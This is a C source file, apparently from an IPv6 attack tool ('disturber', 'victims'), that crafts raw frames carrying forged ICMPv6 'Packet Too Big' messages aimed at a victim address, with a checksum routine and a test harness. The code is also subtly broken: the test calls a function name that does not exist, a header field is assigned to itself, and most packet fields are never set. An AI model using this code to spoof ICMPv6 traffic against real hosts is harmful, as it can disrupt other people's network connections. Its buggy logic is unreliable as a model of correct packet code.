#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include <netinet/ether.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <arpa/inet.h>

#include <disturber.h>
#include <device.h>
#include <victims.h>

static unsigned short in_cksum(const unsigned char *addr, int len) {
	int nleft = len;
	unsigned int sum = 0;
	unsigned short *w = (unsigned short *)addr;
	unsigned short answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(unsigned char *)(&answer) = *(const unsigned char *)w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xFFFF);
	sum += (sum >> 16);
	answer = ~sum;

	return answer;
}

// WARN: needs to be freed
// TODO: O que passar de parâmetro? A estrutura da vítima?
char *alloc_pkt2big() {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmp6;
	char *packet;

	packet = malloc(sizeof(struct ethhdr) +
					sizeof(struct ip6_hdr) +
					sizeof(struct icmp6_hdr));

	/* Ethernet Header*/
	eth = (struct ethhdr *)packet;
	memcpy(eth->h_source, &device.hwaddr, ETH_ALEN);
	memcpy(eth->h_dest, (void *)ether_aton("00:00:03:00:CA:FE"), ETH_ALEN);
	eth->h_proto = htons(ETH_P_IPV6);

	/* IPv6 Header */
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
	ip6->ip6_dst = svictim.ipv6;

	/* ICMPv6 Header */
	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
	icmp6->icmp6_type = ICMP6_PACKET_TOO_BIG;

	return packet;
}

unsigned short icmp6_crc(char *hdr, struct ip6_hdr *dst) {
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmp6;
	struct nd_neighbor_advert *ad;
	unsigned short crc;
	int total_len;

	total_len = sizeof(struct ip6_hdr) + sizeof(struct icmp6_hdr);
	ip6 = (struct ip6_hdr *)malloc(total_len);
	icmp6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));

	bzero(ip6, total_len);

	memcpy(&(ip6->ip6_dst), &(dst->ip6_dst), sizeof(struct in6_addr));
	memcpy(&(ip6->ip6_src), &(dst->ip6_src), sizeof(struct in6_addr));

	ip6->ip6_nxt = ip6->ip6_nxt;
	ip6->ip6_plen = dst->ip6_plen;

	memcpy(icmp6, hdr, sizeof(struct icmp6_hdr));
	debug_packet((char *)ip6);

	crc = in_cksum((unsigned char *)ip6, total_len);
	free(ip6);

	return crc;
}

#ifdef __PKG_TEST__
main() {
	int i;
	char *pkt = pkt2big();

	for (i = 0; i < sizeof(struct ethhdr); i++) {
		printf("%X", pkt[i]);
		if (!((i + 1) % 10))
			printf("\n");
	}
	printf("\n");
}
#endif

